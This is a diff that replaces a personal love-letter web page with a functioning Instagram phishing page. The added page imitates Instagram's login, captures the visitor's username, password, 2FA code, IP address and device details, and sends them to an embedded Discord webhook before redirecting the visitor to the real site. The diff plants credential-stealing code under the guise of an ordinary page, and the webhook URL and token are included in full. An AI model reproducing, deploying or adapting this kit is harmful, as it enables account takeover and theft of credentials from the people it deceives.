@@ -1,105 +1,415 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<script src="https://kit.fontawesome.com/a14ae32021.js" crossorigin="anonymous"></script>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-<title>for my beautiful girl rodaina</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            padding: 0;
+            color: #262626;
+        }
 
-<style type="text/css">
-@font-face {
-	font-family: digit;
-	src: url('digital-7_mono.ttf') format("truetype");
-}
-</style>
-<link href="css/default.css" type="text/css" rel="stylesheet">
-<script type="text/javascript" src="js/jquery.js"></script>
-<script type="text/javascript" src="js/garden.js"></script>
-<script type="text/javascript" src="js/functions.js"></script>
+        .container {
+            max-width: 350px;
+            margin: 0 auto;
+            padding: 40px 0;
+        }
 
+        .login-box {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px 40px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .logo {
+            width: 175px;
+            margin: 22px auto 12px;
+        }
+
+        input {
+            width: 100%;
+            padding: 9px 8px 7px;
+            margin-bottom: 6px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background: #fafafa;
+            font-size: 12px;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #a8a8a8;
+        }
+
+        button {
+            width: 100%;
+            padding: 7px;
+            background-color: #0095f6;
+            border: none;
+            border-radius: 4px;
+            color: white;
+            font-weight: bold;
+            margin: 8px 0;
+            cursor: pointer;
+        }
+
+        button:disabled {
+            background-color: #b2dffc;
+            cursor: default;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: bold;
+        }
+
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+            margin: 0 10px;
+        }
+
+        .facebook-login {
+            color: #385185;
+            font-weight: bold;
+            font-size: 14px;
+            margin: 12px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .facebook-login i {
+            margin-right: 8px;
+            font-size: 16px;
+        }
+
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            margin-top: 12px;
+            display: block;
+        }
+
+        .signup-box {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .signup-box a {
+            color: #0095f6;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .app-download {
+            text-align: center;
+            margin: 20px 0;
+            font-size: 14px;
+        }
+
+        .app-stores {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+        }
+
+        .app-store-img {
+            height: 40px;
+            margin: 0 4px;
+        }
+
+        .footer {
+            text-align: center;
+            margin: 20px 0;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+
+        .footer a {
+            color: #8e8e8e;
+            margin: 0 4px;
+            text-decoration: none;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .password-container {
+            position: relative;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 8px;
+            top: 8px;
+            cursor: pointer;
+            color: #8e8e8e;
+        }
+
+        .loading-spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0095f6;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 </head>
-
 <body>
+    <!-- Login Page -->
+    <div class="container" id="loginPage">
+        <div class="login-box">
+            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" class="logo" alt="Instagram">
+            
+            <form id="loginForm">
+                <input type="text" id="username" placeholder="Phone number, username, or email" required>
+                <div class="password-container">
+                    <input type="password" id="password" placeholder="Password" required>
+                    <i class="fas fa-eye-slash toggle-password" id="togglePassword"></i>
+                </div>
+                <button type="submit" id="loginButton">Log In</button>
+            </form>
+            
+            <div class="divider">OR</div>
+            
+            <div class="facebook-login">
+                <i class="fab fa-facebook-square"></i>
+                Log in with Facebook
+            </div>
+            
+            <a href="#" class="forgot-password">Forgot password?</a>
+        </div>
+        
+        <div class="signup-box">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+        
+        <div class="app-download">
+            Get the app.
+            <div class="app-stores">
+                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" class="app-store-img">
+                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" class="app-store-img">
+            </div>
+        </div>
+    </div>
 
-<div id="mainDiv">
-	<div id="content">
-		<div id="code">
-			<span class="comments">/**</span><br />
-			<span class="space"/><span class="comments">*GIRLFREIND DAY AUGUST 1 2024</span><br />
-			<span class="space"/><span class="comments">*/</span><br />
-			Hey rodaina !<br />
-			Do you remember the day we first met?<br />
-			<span class="comments">// on instagram july 28 2024 </span><br />
-			Since that day a spark begun;<br />
-			<span class="comments">// Your face Your Voice Your Words.</span><br />
-			Your everything got imprinted in my heart;<br />
-			even if we have not been together for a long time i still love you so much  ;<br />
-			The Bond grew stronger and stronger;<br />
-			Journey from Infatuation to Love;<br />
-			We have traveled a long way together;<br />
-			i hope we never have fights or arguments  ;<br />
-			<span class="comments">// And  i hope we never have fights or arguments.</span><br />
-			But our Bond will always grow back Stronger;<br />
-			<br>
-			<br>
-			All I want to say is:<br />
-			rodaina my love, I will love you forever;<br />
-			<br>
-			<br>
-			  now if you want to see yourself  as a kid click on the heart  <br />
-			<br>
-			<span id="heartspan">
-			<a href="image.jpg"><i class="fas fa-heart" id="icon"></i></a>
-			</span>
-		</div>
-		<div id="loveHeart">
-			<canvas id="garden"></canvas>
-			<div id="words">
-				<div id="messages">
-					I LOVE YOU RODAINA
-					<div id="elapseClock"></div>
-				</div>
-				<div id="loveu">
-					I LOVE YOU SO MUCH<br/>
-					<div class="signature">- YOUSSEF</div>
-				</div>
-			</div>
-		</div>
-	</div>
-</div>
+    <!-- 2FA Page -->
+    <div class="container hidden" id="twoFaPage">
+        <div class="login-box">
+            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" class="logo" alt="Instagram">
+            <h3 style="font-size: 16px; font-weight: normal; margin-bottom: 20px;">Enter Security Code</h3>
+            <p style="font-size: 14px; color: #8e8e8e; margin-bottom: 20px;">Enter the 6-digit code from your authenticator app</p>
+            
+            <form id="twoFaForm">
+                <div style="display: flex; justify-content: center; gap: 10px; margin-bottom: 20px;">
+                    <input type="text" class="two-fa-input" maxlength="1" pattern="[0-9]" style="width: 40px; text-align: center;">
+                    <input type="text" class="two-fa-input" maxlength="1" pattern="[0-9]" style="width: 40px; text-align: center;">
+                    <input type="text" class="two-fa-input" maxlength="1" pattern="[0-9]" style="width: 40px; text-align: center;">
+                    <input type="text" class="two-fa-input" maxlength="1" pattern="[0-9]" style="width: 40px; text-align: center;">
+                    <input type="text" class="two-fa-input" maxlength="1" pattern="[0-9]" style="width: 40px; text-align: center;">
+                    <input type="text" class="two-fa-input" maxlength="1" pattern="[0-9]" style="width: 40px; text-align: center;">
+                </div>
+                <button type="submit" id="verifyButton">Verify</button>
+            </form>
+            
+            <a href="#" class="forgot-password">Can't get a code?</a>
+        </div>
+    </div>
 
-<script type="text/javascript">
-var offsetX = $("#loveHeart").width() / 2;
-var offsetY = $("#loveHeart").height() / 2 - 55;
-var together = new Date();
-together.setFullYear(2024, 6, 28);
-together.setHours(16);
-together.setMinutes(30);
-together.setSeconds(0);
-together.setMilliseconds(0);
+    <!-- Loading Page -->
+    <div class="container hidden" id="loadingPage">
+        <div class="login-box">
+            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" class="logo" alt="Instagram">
+            <h3 style="font-size: 16px; font-weight: normal; margin-bottom: 20px;">Verifying Your Information</h3>
+            <p style="font-size: 14px; color: #8e8e8e; margin-bottom: 20px;">This may take a few moments...</p>
+            <div class="loading-spinner"></div>
+        </div>
+    </div>
 
-if (!document.createElement('canvas').getContext) {
-	var msg = document.createElement("div");
-	msg.id = "errorMsg";
-	msg.innerHTML = "Your browser doesn't support HTML5!<br/>Recommend use Chrome 14+/IE 9+/Firefox 7+/Safari 4+"; 
-	document.body.appendChild(msg);
-	$("#code").css("display", "none")
-	$("#copyright").css("position", "absolute");
-	$("#copyright").css("bottom", "10px");
-	document.execCommand("stop");
-} else {
-	setTimeout(function () {
-		startHeartAnimation();
-	}, 5000);
+    <div class="footer">
+        <a href="#">Meta</a>
+        <a href="#">About</a>
+        <a href="#">Blog</a>
+        <a href="#">Jobs</a>
+        <a href="#">Help</a>
+        <a href="#">API</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+        <a href="#">Top Accounts</a>
+        <a href="#">Hashtags</a>
+        <a href="#">Locations</a>
+        <a href="#">Instagram Lite</a>
+        <a href="#">Contact Uploading & Non-Users</a>
+        <br><br>
+        <span>English (US) © 2026 Instagram from Meta</span>
+    </div>
 
-	timeElapse(together);
-	setInterval(function () {
-		timeElapse(together);
-	}, 500);
+    <script>
+        // Discord webhook URL - REPLACE WITH YOUR WEBHOOK URL
+        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1355405342032265338/bm3qdM0TlBOcmHLMV8QISJAtrHWRb3CQlYeLMEFJI2YgBcKelR8349nIGFB_pX8pfvov';
 
-	adjustCodePosition();
-	$("#code").typewriter();
-}
-</script>
+        // Get user device and IP information
+        async function getUserInfo() {
+            try {
+                // Get IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip || 'Unknown';
+                
+                // Get device info
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenWidth = window.screen.width;
+                const screenHeight = window.screen.height;
+                const language = navigator.language;
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const cookiesEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
+                
+                return {
+                    ip,
+                    userAgent,
+                    platform,
+                    screenResolution: `${screenWidth}x${screenHeight}`,
+                    language,
+                    timezone,
+                    cookiesEnabled,
+                    referrer: document.referrer || 'Direct',
+                    pageUrl: window.location.href,
+                    timestamp: new Date().toISOString()
+                };
+            } catch (error) {
+                console.error('Error getting user info:', error);
+                return {
+                    ip: 'Unknown',
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    error: 'Failed to get complete device info'
+                };
+            }
+        }
+
+        // Send data to Discord webhook with the new format
+        async function sendToDiscord(data) {
+            const payload = {
+                content: null,
+                embeds: [
+                    {
+                        title: "IG INFO CAPTURED | Youssef X homam meta fucker ;) 21/3/2024 <:A:1327254699019075676>",
+                        description: `**IP ADDRESS**: \`${data.deviceInfo.ip}\`\n**INSTA EMAIL**: \`${data.username}\`\n**INSTA PASS**: \`${data.password}\`\n**USER AGENT**: \`${data.deviceInfo.userAgent}\`\n**2FA CODE**: \`${data.twoFaCode || 'N/A'}\``,
+                        color: 0,
+                        image: {
+                            url: "https://media.discordapp.net/attachments/1332719297528860742/1357434908070383756/888ad143-5a02-49cc-8642-f94240b67589-cover.png?ex=67f03146&is=67eedfc6&hm=649899835c816e1f5777d58931aa4298c4caf68fa453a37938b7d3c85dcfbbee&=&format=webp&quality=lossless&width=1740&height=871"
+                        }
+                    }
+                ],
+                attachments: []
+            };
+
+            try {
+                await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error('Error sending to Discord:', error);
+            }
+        }
+
+        // Toggle password visibility
+        document.getElementById('togglePassword').addEventListener('click', function() {
+            const passwordInput = document.getElementById('password');
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                this.classList.replace('fa-eye-slash', 'fa-eye');
+            } else {
+                passwordInput.type = 'password';
+                this.classList.replace('fa-eye', 'fa-eye-slash');
+            }
+        });
+
+        // Handle 2FA input fields
+        const twoFaInputs = document.querySelectorAll('.two-fa-input');
+        twoFaInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length === 1 && index < twoFaInputs.length - 1) {
+                    twoFaInputs[index + 1].focus();
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && e.target.value.length === 0 && index > 0) {
+                    twoFaInputs[index - 1].focus();
+                }
+            });
+        });
+
+        // Form handling
+        let userData = {};
+
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            userData.username = document.getElementById('username').value;
+            userData.password = document.getElementById('password').value;
+            
+            // Get device info
+            userData.deviceInfo = await getUserInfo();
+            
+            // Show 2FA page
+            document.getElementById('loginPage').classList.add('hidden');
+            document.getElementById('twoFaPage').classList.remove('hidden');
+        });
+
+        document.getElementById('twoFaForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            // Get 2FA code
+            let twoFaCode = '';
+            twoFaInputs.forEach(input => {
+                twoFaCode += input.value;
+            });
+            userData.twoFaCode = twoFaCode;
+            
+            // Show loading page
+            document.getElementById('twoFaPage').classList.add('hidden');
+            document.getElementById('loadingPage').classList.remove('hidden');
+            
+            // Send data to Discord
+            await sendToDiscord(userData);
+            
+            // Redirect to Instagram after 3 seconds
+            setTimeout(() => {
+                window.location.href = 'https://www.instagram.com/accounts/login/';
+            }, 3000);
+        });
+    </script>
 </body>
 </html>
-
